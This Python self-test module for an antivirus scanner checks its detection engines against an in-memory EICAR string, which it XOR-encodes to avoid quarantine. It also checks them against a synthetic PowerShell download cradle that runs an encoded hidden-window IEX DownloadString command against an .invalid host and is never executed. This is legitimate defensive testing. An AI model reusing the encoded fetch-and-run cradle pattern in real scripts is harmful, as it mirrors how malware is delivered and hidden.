"""Prove the engines work without putting test malware on disk.

The EICAR anti-malware test string is rebuilt in memory from an XOR-encoded
constant, so it never appears in hostguard's files (Defender would otherwise
quarantine them). It is scanned as a buffer only. A harmless synthetic script
with download-cradle patterns exercises the heuristics the same way.
"""

from __future__ import annotations

import base64
import hashlib
from dataclasses import dataclass

from hostguard.models import Verdict
from hostguard.scan.hashdb import HashDB
from hostguard.scan.scanner import Scanner

_EICAR_XOR = bytes.fromhex(
    "026f157b0a7f1a1b0a016e060a00026f6e720a04736d1919736d277e1f13191b0877090e1b141e1b081e"
    "771b140e130c13080f09770e1f090e771c13161f7b7e12711270"
)
_KEY = 0x5A
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


def eicar_bytes() -> bytes:
    data = bytes(b ^ _KEY for b in _EICAR_XOR)
    if hashlib.sha256(data).hexdigest() != EICAR_SHA256:  # pragma: no cover - constant integrity
        raise RuntimeError("EICAR constant corrupted")
    return data


def synthetic_cradle() -> bytes:
    """A harmless .ps1 body that *looks* like a downloader (never executed; .invalid domain)."""
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/x.ps1')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {enc}\r\n".encode()


@dataclass
class SelfTestResult:
    engine: str
    test: str
    passed: bool | None  # None = engine not available
    detail: str


def run(scanner: Scanner) -> list[SelfTestResult]:
    out: list[SelfTestResult] = []
    eicar = eicar_bytes()
    items = scanner.scan_bytes("eicar-selftest.com", eicar)
    hits = items[0].hits

    def found(engine: str) -> list[str]:
        return [h.name for h in hits if h.engine == engine]

    if scanner.yara:
        names = found("yara")
        out.append(
            SelfTestResult(
                "yara", "EICAR in memory", bool(names), ", ".join(names) or "not detected"
            )
        )
    else:
        out.append(SelfTestResult("yara", "EICAR in memory", None, "engine disabled"))
    if scanner.clamd:
        names = found("clamav")
        out.append(
            SelfTestResult(
                "clamav",
                "EICAR in memory (clamd INSTREAM)",
                bool(names),
                ", ".join(names) or "not detected",
            )
        )
    else:
        out.append(
            SelfTestResult(
                "clamav",
                "EICAR in memory",
                None,
                "clamd not available (clamscan fallback only scans files on disk)",
            )
        )

    # Hash engine: the logic is tested with a one-entry in-memory database holding EICAR's hash.
    db = HashDB(bytes.fromhex(EICAR_SHA256), [])
    out.append(
        SelfTestResult(
            "hash",
            "SHA-256 lookup logic (EICAR hash)",
            EICAR_SHA256 in db and hashlib.sha256(eicar).hexdigest() == EICAR_SHA256,
            f"installed lists: {scanner.hashdb.count:,} hashes"
            if scanner.hashdb
            else "no hash lists installed",
        )
    )
    verdict = items[0].verdict
    out.append(
        SelfTestResult(
            "verdict",
            "EICAR verdict",
            verdict == Verdict.MALICIOUS if (scanner.yara or scanner.clamd) else None,
            verdict.value,
        )
    )
    if "heuristics" in scanner.s.engines:
        h_items = scanner.scan_bytes("selftest-cradle.ps1", synthetic_cradle())
        h = h_items[0]
        score = sum(x.score for x in h.hits if x.engine == "heuristics")
        out.append(
            SelfTestResult(
                "heuristics",
                "synthetic encoded PowerShell downloader",
                h.verdict == Verdict.SUSPICIOUS,
                f"score {score}: " + ", ".join(x.name for x in h.hits if x.engine == "heuristics"),
            )
        )
    return out
